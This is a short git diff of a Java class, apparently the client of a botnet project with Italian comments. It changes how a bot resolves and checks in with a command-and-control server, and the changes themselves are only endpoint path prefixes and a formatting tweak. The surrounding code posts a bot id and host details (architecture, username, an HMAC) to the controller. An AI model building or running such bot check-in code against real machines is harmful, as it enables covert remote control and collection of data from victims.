@@ -94,8 +94,7 @@ public class AsyncRequest {
 	// da valutare se devono essere asincroni
 	public Pairs<IP, String> getIpCeCFromDnsServer(String dnsUrl) {
 		Pairs<IP, String> cec = new Pairs<>();
-		Type type = new TypeToken<Pairs<IP, String>>() {
-		}.getType();
+		Type type = new TypeToken<Pairs<IP, String>>() {}.getType();
 		while (true) {
 			try {
 				System.out.println("url request " + dnsUrl);
@@ -126,7 +125,7 @@ public class AsyncRequest {
 			// Type type=new TypeToken<Pairs<Long,Integer>>(){}.getType();
 			// String postRequest = "{\"idBot\":\""+idBot+"\"}";
 			try {
-				String url = HTTPS + ipCeC + PORT + "/welcome";
+				String url = HTTPS + ipCeC + PORT + "/cec/welcome";
 				System.out.println("url challenge request " + url);
 				response = restTemplate.postForObject(url, idBot, response.getClass());
 				// System.out.println("Url:"+url);
@@ -218,7 +217,7 @@ public class AsyncRequest {
 				objects.add(arch);
 				objects.add(usrName);
 				objects.add(hashMac);
-				response = restTemplate.postForObject(HTTPS + dest + PORT + "/hmac", objects, String.class);
+				response = restTemplate.postForObject(HTTPS + dest + PORT + "/cec/hmac", objects, String.class);
 				System.out.println("Ok");
 				return response;
 			} catch (Exception e) {
